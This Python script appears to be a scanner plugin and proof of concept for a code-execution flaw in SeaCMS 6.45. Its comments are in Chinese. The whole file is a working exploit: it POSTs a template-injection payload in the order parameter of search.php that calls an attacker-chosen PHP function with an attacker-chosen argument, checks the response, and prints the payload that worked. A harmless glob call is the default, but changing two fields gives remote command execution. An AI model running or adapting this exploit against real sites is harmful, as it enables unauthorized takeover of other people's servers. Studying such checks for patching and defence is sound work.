#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms 6.45 search.php order参数前台代码执行
referer: unknown
author: Lucifer
description: 文件/search.php中,post参数order存在代码执行漏洞。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['seacms 6.45 search.php order参数前台代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/search.php?searchtype=5"
        post_data = {
            "searchword":"d",
            "order":"}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}", 
            "func":"glob",
            "cmd":"comment.php"
        }
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"comment.php" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

